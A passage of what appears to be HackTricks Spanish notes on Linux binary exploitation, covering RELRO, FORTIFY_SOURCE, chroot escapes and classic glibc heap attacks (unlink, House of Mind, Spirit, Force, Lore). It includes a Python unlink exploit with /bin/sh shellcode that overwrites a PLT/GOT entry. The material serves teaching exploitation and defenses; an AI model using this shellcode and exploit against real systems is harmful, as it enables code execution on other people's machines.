0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Para el binario **sin relro**, podemos ver que la direcci√≥n de la entrada `got` para `fgets` es `0x404018`. Al observar los mapeos de memoria, vemos que cae entre `0x404000` y `0x405000`, lo cual tiene los **permisos `rw`**, lo que significa que podemos leer y escribir en ella. Para el binario **con relro**, vemos que la direcci√≥n de la tabla `got` para la ejecuci√≥n del binario (pie est√° habilitado, por lo que esta direcci√≥n cambiar√°) es `0x555555557fd0`. En el mapeo de memoria de ese binario, cae entre `0x0000555555557000` y `0x0000555555558000`, lo cual tiene el permiso de memoria **`r`**, lo que significa que solo podemos leer de ella.

Entonces, ¬øcu√°l es el **bypass**? El bypass t√≠pico que utilizo es simplemente no escribir en regiones de memoria que relro hace que sean de solo lectura, y **encontrar una forma diferente de lograr la ejecuci√≥n de c√≥digo**.

Ten en cuenta que para que esto suceda, el binario necesita conocer previamente a la ejecuci√≥n las direcciones de las funciones:

* Enlace perezoso: La direcci√≥n de una funci√≥n se busca la primera vez que se llama a la funci√≥n. Por lo tanto, la `GOT` necesita tener permisos de escritura durante la ejecuci√≥n.
* Enlazar ahora: Las direcciones de las funciones se resuelven al principio de la ejecuci√≥n, luego se otorgan permisos de solo lectura a secciones sensibles como .got, .dtors, .ctors, .dynamic, .jcr. `` `** ``-z relro`**`y`**`-z now\`\*\*

Para verificar si un programa utiliza Enlazar ahora, puedes hacer:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Cuando el binario es cargado en memoria y una funci√≥n es llamada por primera vez se salta a la PLT (Procedure Linkage Table), de aqu√≠ se realiza un salto (jmp) a la GOT y descubre que esa entrada no ha sido resuelta (contiene una direcci√≥n siguiente de la PLT). Por lo que invoca al Runtime Linker o rtfd para que resuelva la direcci√≥n y la guarde en la GOT.

Cuando se llama a una funci√≥n se llama a la PLT, esta tiene la direcci√≥n de la GOT donde se almacena la direcci√≥n de la funci√≥n, por lo que redirige el flujo all√≠ y as√≠ se llama a la funci√≥n. Sin embargo, si es la primera vez que se llama a la funci√≥n, lo que hay en la GOT es la siguiente instrucci√≥n de la PLT, por lo tanto el flujo sigue el c√≥digo de la PLT (rtfd) y averigua la direcci√≥n de la funci√≥n, la guarda en la GOT y la llama.

Al cargar un binario en memoria el compilador le ha dicho en qu√© offset tiene que situar datos que se deben de cargar cuando se corre el programa.

Lazy binding ‚Äî> La direcci√≥n de la funci√≥n se busca la primera vez que se invoca dicha funci√≥n, por lo que la GOT tiene permisos de escritura para que cuando se busque, se guarde ah√≠ y no haya que volver a buscarla.

Bind now ‚Äî> Las direcciones de las funciones se buscan al cargar el programa y se cambian los permisos de las secciones .got, .dtors, .ctors, .dynamic, .jcr a solo lectura. **-z relro** y **-z now**

A pesar de esto, en general los programas no est√°n complicados con esas opciones luego estos ataques siguen siendo posibles.

**readelf -l /proc/ID\_PROC/exe | grep BIND\_NOW** ‚Äî> Para saber si usan el BIND NOW

**Fortify Source -D\_FORTIFY\_SOURCE=1 o =2**

Trata de identificar las funciones que copian de un sitio a otro de forma insegura y cambiar la funci√≥n por una funci√≥n segura.

Por ej:\
char buf\[16];\
strcpy(but, source);

La identifica como insegura y entonces cambia strcpy() por \_\_strcpy\_chk() utilizando el tama√±o del buffer como tama√±o m√°ximo a copiar.

La diferencia entre **=1** o **=2** es que:

La segunda no permite que **%n** venga de una secci√≥n con permisos de escritura. Adem√°s el par√°metro para acceso directo de argumentos solo puede ser usado si se usan los anteriores, es decir, solo se pueda usar **%3$d** si antes se ha usado **%2$d** y **%1$d**

Para mostrar el mensaje de error se usa el argv\[0], por lo que si se pone en el la direcci√≥n de otro sitio (como una variable global) el mensaje de error mostrar√° el contenido de dicha variable. Pag 191

**Reemplazo de Libsafe**

Se activa con: LD\_PRELOAD=/lib/libsafe.so.2\
o\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Se interceptan las llamadas a algunas funciones inseguras por otras seguras. No est√° estandarizado. (solo para x86, no para compilaxiones con -fomit-frame-pointer, no compilaciones estaticas, no todas las funciones vulnerables se vuelven seguras y LD\_PRELOAD no sirve en binarios con suid).

**ASCII Armored Address Space**

Consiste en cargar las librer√≠a compartidas de 0x00000000 a 0x00ffffff para que siempre haya un byte 0x00. Sin embargo, esto realmente no detiene a penas ning√∫n ataque, y menos en little endian.

**ret2plt**

Consiste en realiza un ROP de forma que se llame a la funci√≥n strcpy@plt (de la plt) y se apunte a la entrada de la GOT y se copie el primer byte de la funci√≥n a la que se quiere llamar (system()). Acto seguido se hace lo mismo apuntando a GOT+1 y se copia el 2¬∫byte de system()‚Ä¶ Al final se llama la direcci√≥n guardada en GOT que ser√° system()

**Falso EBP**

Para las funciones que usen el EBP como registro para apuntar a los argumentos al modificar el EIP y apuntar a system() se debe haber modificado el EBP tambi√©n para que apunte a una zona de memoria que tenga 2 bytes cuales quiera y despu√©s la direcci√≥n a &‚Äù/bin/sh‚Äù.

**Jaulas con chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Instala un sistema b√°sico bajo un subdirectorio espec√≠fico

Un admin puede salir de una de estas jaulas haciendo: mkdir foo; chroot foo; cd ..

**Instrumentaci√≥n de c√≥digo**

Valgrind ‚Äî> Busca errores\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Exploits b√°sicos**

**Trozo asignado**

prev\_size |\
size | ‚ÄîCabecera\
\*mem | Datos

**Trozo libre**

prev\_size |\
size |\
\*fd | Ptr forward chunk\
\*bk | Ptr back chunk ‚ÄîCabecera\
\*mem | Datos

Los trozos libres est√°n en una lista doblemente enlazada (bin) y nunca pueden haber dos trozos libres juntos (se juntan)

En ‚Äúsize‚Äù hay bits para indicar: Si el trozo anterior est√° en uso, si el trozo ha sido asignado mediante mmap() y si el trozo pertenece al arena primario.

Si al liberar un trozo alguno de los contiguos se encuentra libre , estos se fusionan mediante la macro unlink() y se pasa el nuevo trozo m√°s grande a frontlink() para que le inserte el bin adecuado.

unlink(){\
BK = P->bk; ‚Äî> El BK del nuevo chunk es el que tuviese el que ya estaba libre antes\
FD = P->fd; ‚Äî> El FD del nuevo chunk es el que tuviese el que ya estaba libre antes\
FD->bk = BK; ‚Äî> El BK del siguiente chunk apunta al nuevo chunk\
BK->fd = FD; ‚Äî> El FD del anterior chunk apunta al nuevo chunk\
}

Por lo tanto si conseguimos modificar el P->bk con la direcci√≥n de un shellcode y el P->fd con la direcci√≥n a una entrada en la GOT o DTORS menos 12 se logra:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Y as√≠ se se ejecuta al salir del programa la shellcode.

Adem√°s, la 4¬∫ sentencia de unlink() escribe algo y la shellcode tiene que estar reparada para esto:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Esto provoca la escritura de 4 bytes a partir del 8¬∫ byte de la shellcode, por lo que la primera instrucci√≥n de la shellcode debe ser un jmp para saltar esto y caer en unos nops que lleven al resto de la shellcode.

Por lo tanto el exploit se crea:

En el buffer1 metemos la shellcode comenzando por un jmp para que caiga en los nops o en el resto de la shellcode.

Despu√©s de la shell code metemos relleno hasta llegar al campo prev\_size y size del siguiente trozo. En estos sitios metemos 0xfffffff0 (de forma que se sobrescrita el prev\_size para que tenga el bit que dice que est√° libre) y ‚Äú-4‚Äú(0xfffffffc) en el size (para que cuando compruebe en el 3¬∫ trozo si el 2¬∫ estaba libre en realidad vaya al prev\_size modificado que le dir√° que s¬¥est√° libre) -> As√≠ cuando free() investigue ir√° al size del 3¬∫ pero en realidad ir√° al 2¬∫ - 4 y pensar√° que el 2¬∫ trozo est√° libre. Y entonces llamar√° a **unlink()**.

Al llamar a unlink() usar√° como P->fd los primeros datos del 2¬∫ trozo por lo que ah√≠ se meter√° la direcci√≥n que se quieres sobreescribir - 12(pues en FD->bk le sumar√° 12 a la direcci√≥n guardada en FD) . Y en esa direcci√≥n introducir√° la segunda direcci√≥n que encuentre en el 2¬∫ trozo, que nos interesar√° que sea la direcci√≥n a la shellcode(P->bk falso).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Es crucial que el bit que indica que el fragmento anterior est√° libre est√© en 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, para que piense que el tama√±o del tercer fragmento est√° 4 bytes detr√°s (apunta a prev\_size) ya que es donde verifica si el segundo fragmento est√° libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Al principio del payload a√±adimos 8 bytes de relleno**

**got\_free = pack("\<I", 0x08048300 - 12) #Direcci√≥n de free() en la plt-12 (ser√° la direcci√≥n que se sobrescriba para que se ejecute la shellcode la segunda vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Como se mencion√≥, el payload comienza con 8 bytes de relleno por dise√±o**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica el segundo fragmento, got\_free apunta a donde guardaremos la direcci√≥n addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

Controlamos 3 fragmentos consecutivos y se liberan en orden inverso al ser reservados.

En este caso:

En el fragmento c se coloca la shellcode

Se utiliza el fragmento a para sobrescribir el b de manera que el tama√±o tenga el bit PREV\_INUSE desactivado, haci√©ndolo parecer libre.

Adem√°s, se sobrescribe en la cabecera b el tama√±o para que sea -4.

Entonces, el programa creer√° que "a" est√° libre y en un bin, por lo que llamar√° a unlink() para desvincularlo. Sin embargo, al tener el tama√±o PREV\_SIZE como -4, creer√° que el fragmento "a" realmente comienza en b+4. Es decir, realizar√° un unlink() en un fragmento que comienza en b+4, por lo que en b+12 estar√° el puntero "fd" y en b+16 estar√° el puntero "bk".

De esta forma, si colocamos la direcci√≥n de la shellcode en bk y la direcci√≥n de la funci√≥n "puts()" -12 en fd, tendremos nuestro payload.

**T√©cnica de Frontlink**

Se llama a frontlink cuando se libera algo y ninguno de sus fragmentos contiguos est√° libre, en lugar de llamar a unlink(), se llama directamente a frontlink().

Vulnerabilidad √∫til cuando el malloc atacado nunca se libera (free()).

Requiere:

Un buffer que pueda desbordarse con la funci√≥n de entrada de datos

Un buffer contiguo que debe ser liberado y cuyo campo fd de la cabecera se modificar√° gracias al desbordamiento del buffer anterior

Un buffer a liberar con un tama√±o mayor a 512 pero menor que el buffer anterior

Un buffer declarado antes del paso 3 que permita sobrescribir el prev\_size de este

De esta forma, al sobrescribir en dos mallocs de forma descontrolada y en uno de forma controlada pero que solo se libera ese uno, podemos realizar un exploit.

**Vulnerabilidad double free()**

Si se llama a free() dos veces con el mismo puntero, quedan dos bins apuntando a la misma direcci√≥n.

Si se desea volver a utilizar uno, se asignar√° sin problemas. Si se desea utilizar otro, se asignar√° el mismo espacio, por lo que los punteros "fd" y "bk" estar√°n falsificados con los datos que escriba la reserva anterior.

**After free()**

Un puntero liberado previamente se utiliza nuevamente sin control.

## **8 Heap Overflows: Exploits avanzados**

Las t√©cnicas de Unlink() y FrontLink() fueron eliminadas al modificar la funci√≥n unlink().

**The house of mind**

Solo se necesita una llamada a free() para provocar la ejecuci√≥n de c√≥digo arbitrario. Es importante buscar un segundo fragmento que pueda ser desbordado por uno anterior y liberado.

Una llamada a free() provoca la llamada a public\_fREe(mem), que hace:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Devuelve un puntero a la direcci√≥n donde comienza el fragmento (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

En \[1] se comprueba el campo size con el bit NON\_MAIN\_ARENA, que se puede alterar para que la comprobaci√≥n devuelva true y ejecute heap\_for\_ptr(), que realiza un and a "mem" dejando en 0 los 2.5 bytes menos significativos (por ejemplo, de 0x0804a000 a 0x08000000) y accede a 0x08000000->ar\_ptr (como si fuera un struct heap\_info)

De esta forma, si podemos controlar un fragmento, por ejemplo en 0x0804a000, y se va a liberar un fragmento en **0x081002a0**, podemos llegar a la direcci√≥n 0x08100000 y escribir lo que queramos, por ejemplo **0x0804a000**. Cuando se libere este segundo fragmento, encontrar√° que heap\_for\_ptr(ptr)->ar\_ptr devuelve lo que hemos escrito en 0x08100000 (pues se aplica a 0x081002a0 el and que vimos antes y de ah√≠ se extrae el valor de los 4 primeros bytes, el ar\_ptr)

Se llama a \_int\_free(ar\_ptr, mem), es decir, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Como vimos antes, podemos controlar el valor de av, ya que es lo que escribimos en el fragmento que se va a liberar.

Como se define unsorted\_chunks, sabemos que:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Por lo tanto, si escribimos el valor de \_\_DTOR\_END\_\_-12 en av->bins\[2], en la √∫ltima instrucci√≥n se escribir√° en \_\_DTOR\_END\_\_ la direcci√≥n del segundo fragmento.

Es decir, en el primer fragmento debemos colocar al inicio muchas veces la direcci√≥n de \_\_DTOR\_END\_\_-12, ya que av->bins\[2] lo tomar√° de all√≠.

En la direcci√≥n donde caiga la direcci√≥n del segundo fragmento con los √∫ltimos 5 ceros, debemos escribir la direcci√≥n de este primer fragmento para que heap\_for\_ptr() piense que ar\_ptr est√° al inicio del primer fragmento y tome av->bins\[2] de all√≠.

En el segundo fragmento y gracias al primero, sobrescribimos prev\_size con un salto de 0x0c y el tama√±o con algo para activar -> NON\_MAIN\_ARENA

Luego, en el segundo fragmento, colocamos una gran cantidad de nops y finalmente la shellcode.

De esta forma, se llamar√° a \_int\_free(FRAGMENTO1, FRAGMENTO2) y seguir√° las instrucciones para escribir en \_\_DTOR\_END\_\_ la direcci√≥n del prev\_size del FRAGMENTO2, el cual saltar√° a la shellcode.

Para aplicar esta t√©cnica, se necesitan cumplir algunos requisitos adicionales que complican un poco m√°s el payload.
Esta t√©cnica ya no es aplicable pues se aplic√≥ casi el mismo parche que para unlink. Se comparan si el nuevo sitio al que se apunta tambi√©n le est√° apuntando a √©l.

**Fastbin**

Es una variante de The house of mind

nos interesa llegar a ejecutar el siguiente c√≥digo al cu√°l se llega pasada la primera comprobaci√≥n de la funci√≥n \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Siendo fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

De esta forma si se pone en ‚Äúfb‚Äù da direcci√≥n de una funci√≥n en la GOT, en esta direcci√≥n se pondr√° la direcci√≥n al trozo sobrescrito. Para esto ser√° necesario que la arena est√© cerca de las direcciones de dtors. M√°s exactamente que av->max\_fast est√© en la direcci√≥n que vamos a sobreescribir.

Dado que con The House of Mind se vio que nosotros control√°bamos la posici√≥n del av.

Entones si en el campo size ponemos un tama√±o de 8 + NON\_MAIN\_ARENA + PREV\_INUSE ‚Äî> fastbin\_index() nos devolver√° fastbins\[-1], que apuntar√° a av->max\_fast

En este caso av->max\_fast ser√° la direcci√≥n que se sobrescrita (no a la que apunte, sino esa posici√≥n ser√° la que se sobrescrita).

Adem√°s se tiene que cumplir que el trozo contiguo al liberado debe ser mayor que 8 -> Dado que hemos dicho que el size del trozo liberado es 8, en este trozo falso solo tenemos que poner un size mayor que 8 (como adem√°s la shellcode ir√° en el trozo liberado, habr√° que poner al ppio un jmp que caiga en nops).

Adem√°s, ese mismo trozo falso debe ser menor que av->system\_mem. av->system\_mem se encuentra 1848 bytes m√°s all√°.

Por culpa de los nulos de \_DTOR\_END\_ y de las pocas direcciones en la GOT, ninguna direcci√≥n de estas secciones sirven para ser sobrescritas, as√≠ que veamos como aplicar fastbin para atacar la pila.

Otra forma de ataque es redirigir el **av** hacia la pila.

Si modificamos el size para que de 16 en vez de 8 entonces: fastbin\_index() nos devolver√° fastbins\[0] y podemos hacer uso de esto para sobreescribir la pila.

Para esto no debe haber ning√∫n canary ni valores raros en la pila, de hecho tenemos que encontrarnos en esta: 4bytes nulos + EBP + RET

Los 4 bytes nulo se necesitan que el **av** estar√° a esta direcci√≥n y el primero elemento de un **av** es el mutexe que tiene que valer 0.

El **av->max\_fast** ser√° el EBP y ser√° un valor que nos servir√° para saltarnos las restricciones.

En el **av->fastbins\[0]** se sobreescribir√° con la direcci√≥n de **p** y ser√° el RET, as√≠ se saltar√° a la shellcode.

Adem√°s, en **av->system\_mem** (1484bytes por encima de la posici√≥n en la pila) habr√° bastante basura que nos permitir√° saltarnos la comprobaci√≥n que se realiza.

Adem√°s se tiene que cumplir que el trozo contiguo al liberado debe ser mayor que 8 -> Dado que hemos dicho que el size del trozo liberado es 16, en este trozo falso solo tenemos que poner un size mayor que 8 (como adem√°s la shellcode ir√° en el trozo liberado, habr√° que poner al ppio un jmp que caiga en nops que van despu√©s del campo size del nuevo trozo falso).

**The House of Spirit**

En este caso buscamos tener un puntero a un malloc que pueda ser alterable por el atacante (por ej, que el puntero est√© en el stack debajo de un posible overflow a una variable).

As√≠, podr√≠amos hacer que este puntero apuntase a donde fuese. Sin embargo, no cualquier sitio es v√°lido, el tama√±o del trozo falseado debe ser menor que av->max\_fast y m√°s espec√≠ficamente igual al tama√±o solicitado en una futura llamada a malloc()+8. Por ello, si sabemos que despu√©s de este puntero vulnerable se llama a malloc(40), el tama√±o del trozo falso debe ser igual a 48.

Si por ejemplo el programa preguntase al usuario por un n√∫mero podr√≠amos introducir 48 y apuntar el puntero de malloc modificable a los siguientes 4bytes (que podr√≠an pertenecer al EBP con suerte, as√≠ el 48 queda por detr√°s, como si fuese la cabecera size). Adem√°s, la direcci√≥n ptr-4+48 debe cumplir varias condiciones (siendo en este caso ptr=EBP), es decir, 8 < ptr-4+48 < av->system\_mem.

En caso de que esto se cumpla, cuando se llame al siguiente malloc que dijimos que era malloc(40) se le asignar√° como direcci√≥n la direcci√≥n del EBP. En caso de que el atacante tambi√©n pueda controlar lo que se escribe en este malloc puede sobreescribir tanto el EBP como el EIP con la direcci√≥n que quiera.

Esto creo que es porque as√≠ cuando lo libere free() guardar√° que en la direcci√≥n que apunta al EBP del stack hay un trozo de tama√±o perfecto para el nuevo malloc() que se quiere reservar, as√≠ que le asigna esa direcci√≥n.

**The House of Force**

Es necesario:

* Un overflow a un trozo que permita sobreescribir el wilderness
* Una llamada a malloc() con el tama√±o definido por el usuario
* Una llamada a malloc() cuyos datos puedan ser definidos por el usuario

Lo primero que se hace es sobreescribir el size del trozo wilderness con un valor muy grande (0xffffffff), as√≠ cualquiera solicitud de memoria lo suficientemente grande ser√° tratada en \_int\_malloc() sin necesidad de expandir el heap

Lo segundo es alterar el av->top para que apunte a una zona de memoria bajo el control del atacante, como el stack. En av->top se pondr√° \&EIP - 8.

Tenemos que sobreescrbir av->top para que apunte a la zona de memoria bajo el control del atacante:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim recoge el valor de la direcci√≥n del trozo wilderness actual (el actual av->top) y remainder es exactamente la suma de esa direcci√≥n m√°s la cantidad de bytes solicitados por malloc(). Por lo que si \&EIP-8 est√° en 0xbffff224 y av->top contiene 0x080c2788, entonces la cantidad que tenemos que reservar en el malloc controlado para que av->top quede apuntando a $EIP-8 para el pr√≥ximo malloc() ser√°:

0xbffff224 - 0x080c2788 = 3086207644.

As√≠ se guardar√° en av->top el valor alterado y el pr√≥ximo malloc apuntar√° al EIP y lo podr√° sobreescribir.

Es importante saber que el size del nuevo trozo wilderness sea m√°s grande que la solicitud realizada por el √∫ltimo malloc(). Es decir, si el wilderness est√° apuntando a \&EIP-8, el size quedar√° justo en el campo EBP del stack.

**The House of Lore**

**Corrupci√≥n SmallBin**

Los trozos liberados se introducen en el bin en funci√≥n de su tama√±o. Pero antes de introduciros se guardan en unsorted bins. Un trozo es liberado no se mete inmediatamente en su bin sino que se queda en unsorted bins. A continuaci√≥n, si se reserva un nuevo trozo y el anterior liberado le puede servir se lo devuelve, pero si se reserva m√°s grande, el trozo liberado en unsorted bins se mete en su bin adecuado.

Para alcanzar el c√≥digo vulnerable la solicitud de memora deber√° ser mayor a av->max\_fast (72normalmente) y menos a MIN\_LARGE\_SIZE (512).

Si en los bin hay un trozo del tama√±o adecuado a lo que se pide se devuelve ese despu√©s de desenlazarlo:

bck = victim->bk; Apunta al trozo anterior, es la √∫nica info que podemos alterar.

bin->bk = bck; El pen√∫ltimo trozo pasa a ser el √∫ltimo, en caso de que bck apunte al stack al siguiente trozo reservado se le dar√° esta direcci√≥n

bck->fd = bin; Se cierra la lista haciendo que este apunte a bin

Se necesita:
Reservar dos malloc, de forma que se pueda hacer overflow al primero despu√©s de liberar el segundo e introducirlo en su bin.

El malloc reservado con la direcci√≥n elegida por el atacante debe ser controlado por este.

El objetivo es hacer un overflow a un heap que tenga un trozo liberado y en su bin debajo, para alterar su puntero bk. Si este trozo se convierte en el primero de la lista de bin y se reserva, se enga√±ar√° al bin para que crea que el siguiente trozo est√° en una direcci√≥n falsa. Al reservar otro trozo, si el atacante tiene permisos en √©l, se le dar√° un trozo en la posici√≥n deseada para escribir en ella.

Para ejecutar la vulnerabilidad r√°pidamente, se deben seguir estos pasos: reservar el trozo vulnerable, reservar el trozo a modificar, liberar el segundo trozo, reservar un trozo m√°s grande que el segundo, modificar el trozo vulnerable con un overflow, reservar un trozo del mismo tama√±o que el vulnerado y reservar un segundo trozo del mismo tama√±o que apunte a la direcci√≥n elegida.

Para proteger este ataque, se realiza una comprobaci√≥n para verificar que el trozo no es falso: se verifica si bck->fd apunta a la v√≠ctima. Para superar esta protecci√≥n, el atacante debe poder escribir en la direcci√≥n de la v√≠ctima de alguna manera.

**Corrupci√≥n LargeBin**

Se requieren los mismos requisitos que antes y los trozos reservados deben ser mayores a 512. Se debe modificar el puntero bk y el tama√±o del trozo modificado de forma que size - nb sea < MINSIZE.

**Heap Spraying**

Consiste en reservar toda la memoria posible para heaps y rellenarlos con nops seguidos de una shellcode. Se intenta saltar a la direcci√≥n 0x0c0c0c0c, esperando que haya nops all√≠.

**Heap Feng Shui**

Se sementa la memoria reservando y liberando trozos para dejar trozos reservados entre trozos libres. El buffer a desbordar se sit√∫a en uno de los huecos.

## Cursos interesantes

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Referencias**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
